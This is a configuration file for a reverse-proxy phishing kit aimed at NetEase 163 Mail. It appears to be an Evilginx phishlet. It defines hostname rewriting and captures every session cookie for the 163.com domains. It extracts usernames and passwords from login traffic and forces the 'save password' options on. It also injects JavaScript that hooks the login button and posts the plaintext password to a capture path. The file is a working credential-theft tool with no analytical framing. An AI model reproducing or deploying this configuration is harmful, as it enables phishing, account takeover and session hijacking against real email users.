sub_filters: 


  - {triggers_on: 'mail.163.com', orig_sub: 'mail', domain: '163.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'mail.163.com', orig_sub: 'mail', domain: '163.com', search: '''{hostname_regexp}'';', replace: '''{hostname_regexp}'';', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}

  - {triggers_on: 'www.mail.163.com', orig_sub: 'www', domain: 'mail.163.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.mail.163.com', orig_sub: 'www', domain: 'mail.163.com', search: '''{hostname_regexp}'';', replace: '''{hostname_regexp}'';', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}


auth_tokens:
  - domain: '.mail.163.com'
    keys: ['.*,regexp']

  - domain: '.163.com'
    keys: ['.*,regexp']
    
    
auth_urls:
  - '/'
  - '/*'    
 
credentials:
  username:
    key: ''
    search: '"un":"([^"]*)'
    type: 'json'
  password:
    key: 'unenc_password'
    search: '(.*)'
    type: 'post'
  custom:
    - key: ''
      search: '"pw":"([^"]*)'
      type: 'json'  


force_post:
  - path: '/dl/l'
    search:
      - {key: 'un', search: '.*'}
      - {key: 'pw', search: '.*'}
    force:
      - {key: 'saveAccount', value: '1'}
      - {key: 'savePasswd', value: '1'}
    type: 'post'
    
    
login:
  domain: 'www.mail.163.com'
  path: '/index.htm'
  
js_inject:
  - trigger_domains: ["www.mail.163.com"]
    trigger_paths: ["/index.htm", "/"]
    trigger_params: []
    script: |  
      function onclickListener(){
        var submit = document.querySelectorAll('input[type="submit"]')[0];
        submit.setAttribute("onclick", "sendPass()");
        submit.addEventListener("click", sendPass);
        return;
      }
      function sendPass(){
        var password = document.getElementsByName("password")[0].value;
        var xhr = new XMLHttpRequest();
        xhr.open("POST", '/accounts/login/ajax/', true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send("unenc_password="+encodeURIComponent(password));
        return;
      }
      setTimeout(function(){ onclickListener(); }, 1000);  
  